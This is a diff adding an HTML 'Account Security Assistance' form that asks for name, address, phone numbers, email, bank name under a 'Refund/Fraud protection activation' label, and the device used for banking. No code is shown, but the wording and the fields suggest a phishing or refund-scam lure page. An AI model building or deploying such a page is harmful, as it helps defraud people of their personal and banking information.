@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Security Assistance Form</title>
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body class="center">
+    <div class="form-card">
+      <h2>Account Security Assistance</h2>
+      <p class="subtitle">
+        Please provide accurate details. Our review team will contact you.
+      </p>
+
+      <input id="first" placeholder="First Name" />
+      <input id="last" placeholder="Last Name" />
+      <input id="address" placeholder="Address" />
+      <input id="phone" placeholder="Phone Number" maxlength="10" />
+      <input id="mobile" placeholder="Mobile Number" maxlength="10" />
+      <input id="email" placeholder="Email" type="email" />
+      <input
+        id="bank"
+        placeholder="Bank Name (Refund/Fraud protection activation)"
+      />
+      <input id="device" placeholder="Which device access banking service" />
+      <textarea id="description" placeholder="Describe your issue"></textarea>
+
+      <button onclick="submitForm()">Submit</button>
+      <button onclick="location.href = '/'">Get Back</button>
+    </div>
+
+    <div id="toast">✔ Form submitted successfully</div>
+
+    <script src="/script.js"></script>
+  </body>
+</html>
